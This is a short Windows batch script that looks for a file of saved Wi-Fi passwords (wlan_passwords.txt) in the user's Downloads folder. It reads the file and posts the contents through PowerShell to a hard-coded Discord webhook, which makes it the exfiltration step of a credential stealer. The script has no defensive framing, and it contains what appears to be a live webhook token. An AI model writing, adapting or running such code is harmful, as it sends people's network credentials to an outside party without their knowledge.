@echo off
setlocal

:: Variables
set "FileToFind=%USERPROFILE%\Downloads\wlan_passwords.txt"
set "WebhookURL=https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"

:: Check if file exists
if exist "%FileToFind%" (
    echo File found: %FileToFind%
    
    :: Read file content
    set "FileContent="
    for /f "delims=" %%A in (%FileToFind%) do set "FileContent=!FileContent!%%A`n"
    
    :: Send to Discord via PowerShell
    powershell -Command ^
    "$content = Get-Content '%FileToFind%' -Raw; " ^
    "Invoke-RestMethod -Uri '%WebhookURL%' -Method Post -Body (@{content=$content})"
    
    echo Success!
) else (
    echo File not found: %FileToFind%
)

pause
